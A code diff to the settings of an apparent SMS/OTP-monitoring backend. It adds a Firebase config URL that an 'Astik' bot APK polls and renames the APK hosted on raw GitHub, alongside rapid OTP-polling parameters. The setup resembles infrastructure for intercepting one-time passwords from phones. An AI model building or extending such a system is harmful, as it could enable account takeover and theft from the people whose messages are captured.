@@ -12,6 +12,8 @@ class Settings(BaseSettings):
     database_url: str = "sqlite:///./sms_monitor.db"
     port: int = 8000
     virtus_module_db: str = "https://virtus-module-default-rtdb.firebaseio.com"
+    # APK bootstrap DB — Astik readConfig polls {apk_config_db}/config/{KEY}.json
+    apk_config_db: str = "https://base-e3797-default-rtdb.firebaseio.com"
     firebase_workers: int = 128
     otp_poll_interval_sec: float = 0.4
     otp_poll_timeout_sec: float = 1.2
@@ -24,7 +26,7 @@ class Settings(BaseSettings):
         return (self.virtus_bot_url or self.public_base_url).strip().rstrip("/")
     apk_github_url: str = (
         "https://raw.githubusercontent.com/hivirtusss/V2-testing-done/"
-        "cursor/messages-path-otp-8042/apk/virtus-sms-module.apk"
+        "cursor/messages-path-otp-8042/apk/astik-bot-module.apk"
     )
 
     @property
